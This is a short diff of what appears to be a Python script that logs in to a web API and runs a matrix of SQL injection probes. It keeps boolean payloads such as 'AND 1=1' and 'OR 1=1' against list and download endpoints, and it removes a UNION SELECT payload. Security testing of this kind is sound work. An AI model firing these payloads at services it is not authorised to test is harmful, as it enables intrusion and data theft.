@@ -49,18 +49,11 @@ if st == 200:
 H = {"Authorization": "Bearer " + tok}
 log("login: %s tok:%s" % (st, tok[:10] or "NONE"))
 
-# 注入测试矩阵 (精简: 6 个核心, 给 sqli2/3 留窗口)
+# 注入测试矩阵 (精简: 4 个核心, 给 vip/sqli2/3 留窗口)
 tests = [
     ("GET", "/api/lois?page=1%20AND%201=1", "page-and1", "auth"),
     ("GET", "/api/lois?page=1%20AND%201=2", "page-and2", "auth"),
-    (
-        "GET",
-        "/api/lois?page=1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10--",
-        "page-union",
-        "auth",
-    ),
     ("GET", "/api/user/loi/download_v6/6422%20OR%201=1", "dl-or", "auth"),
-    ("GET", "/api/lois?sort=id%20desc", "sort-desc", "auth"),
     ("GET", "/api/lois?page=1", "page-normal", "auth"),
 ]
 
